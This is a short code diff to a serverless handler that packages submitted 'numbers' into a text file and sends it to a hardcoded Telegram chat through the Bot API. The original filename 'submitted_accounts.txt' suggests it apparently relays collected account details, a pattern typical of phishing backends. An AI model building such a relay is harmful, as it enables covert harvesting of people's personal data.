@@ -4,13 +4,14 @@ exports.handler = async (event) => {
     const CHAT_ID = "6442344136";
 
     const body = JSON.parse(event.body || "{}");
-    const numbers = body.numbers || "No numbers received";
+    const numbers = body.numbers || "";
+    const filename = body.filename || "submission";
 
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
 
     const blob = new Blob([numbers], { type: "text/plain" });
-    formData.append("document", blob, "submitted_accounts.txt");
+    formData.append("document", blob, `${filename}.txt`);
 
     const response = await fetch(
       `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
@@ -20,19 +21,15 @@ exports.handler = async (event) => {
       }
     );
 
-    const result = await response.json();
-    console.log("Telegram response:", result);
-
     return {
       statusCode: 200,
-      body: JSON.stringify(result)
+      body: await response.text()
     };
 
   } catch (err) {
-    console.log("ERROR:", err);
     return {
       statusCode: 500,
-      body: "Error sending TXT file"
+      body: err.toString()
     };
   }
 };
